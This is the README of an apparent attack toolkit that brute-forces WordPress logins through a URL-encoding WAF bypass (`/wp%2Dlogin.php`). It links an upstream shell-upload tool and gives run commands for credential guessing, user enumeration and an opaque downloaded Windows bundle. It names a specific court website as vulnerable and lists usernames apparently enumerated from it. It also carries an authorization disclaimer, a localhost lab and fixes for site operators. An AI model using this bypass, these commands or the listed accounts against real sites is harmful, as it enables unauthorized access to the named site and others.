# WordPress Bruter + CloudFront WAF Bypass (`/wp%2Dlogin.php`)

Setup for [bossxz238/Wordpress-Bruter-And-Upload-Shell](https://github.com/bossxz238/Wordpress-Bruter-And-Upload-Shell) plus a **Linux runner** that implements the bypass described for sites like `sc.judiciary.gov.ph` (literal WAF match on `wp-login.php` without URL decoding).

## The vulnerability (summary)

| Request | WAF sees | Origin (Apache) serves |
|---------|----------|-------------------------|
| `/wp-login.php` | `wp-login.php` | Blocked → **403** |
| `/wp%2Dlogin.php` | `wp%2Dlogin.php` (no match) | Decodes to `wp-login.php` → **200** |

**Impact:** Exposes the login form, enables user enumeration via error messages, password-reset probing, and (without rate limits) credential guessing.

**Fix (operators):** Decode/normalize URLs before WAF rules; block at origin; rate-limit `wp-login.php`; restrict admin by IP/VPN; remove test accounts; disable user listing via REST API.

## Authorized use only

Do **not** run brute-force or enumeration against `sc.judiciary.gov.ph` or any system without **written authorization**. This repo’s automated tests target **localhost:8080** only.

## Quick start (local lab)

```bash
cd tools/wordpress-bruter
chmod +x setup.sh run_tests.sh
./run_tests.sh
```

Manual checks:

```bash
# Read-only WAF vs bypass comparison
python3 verify_waf_bypass.py -u http://localhost:8080

# Login attempt through bypass (lab credentials admin/admin123)
python3 wp_bruter.py -u http://localhost:8080 --bypass hyphen

# Enumeration mode (one probe password per user) — lab only
python3 wp_bruter.py -u http://localhost:8080 --bypass hyphen --enumerate-only --users wordlists/users.txt
```

## Bypass modes (`--bypass`)

- `hyphen` (default) — `/wp%2Dlogin.php`
- `none` — `/wp-login.php` (should hit WAF in lab)
- `encoded` — full segment encoding

## Example finding context (sc.judiciary.gov.ph)

Documented users (from REST API + login enumeration in your report): `scweb`, `pio_tyke`, `pio_jerome`, `tyke-test-admin`, `pio_rus`. Store these only in your **authorized** engagement notes—not in automated runs against production.

## Files

| File | Role |
|------|------|
| `verify_waf_bypass.py` | GET-only blocked vs bypass check |
| `wp_bruter.py` | Login / enumeration via bypass path |
| `waf_bypass.py` | Path builders and body padding |
| `lab/` | Docker WordPress + nginx literal WAF |

## Windows upstream bundle

```bash
./setup.sh   # downloads vendor/tool.zip (luajit.exe + static.txt)
cd vendor/extracted && wine luajit.exe static.txt   # Windows only
```

On Linux, use `wp_bruter.py` / `verify_waf_bypass.py`.
